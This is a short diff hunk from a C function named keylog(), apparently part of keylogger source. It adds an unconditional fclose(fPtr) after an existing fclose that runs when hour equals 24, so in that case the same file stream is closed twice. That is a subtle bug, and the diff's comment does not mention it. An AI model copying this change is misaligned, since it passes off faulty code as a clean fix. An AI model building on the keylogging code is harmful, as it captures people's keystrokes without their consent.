@@ -19,6 +19,8 @@ int keylog()
     if(hour == 24)
         fclose(fPtr);
     
+    fclose(fPtr); // Close the file stream
+    
     return 0;
 }
 
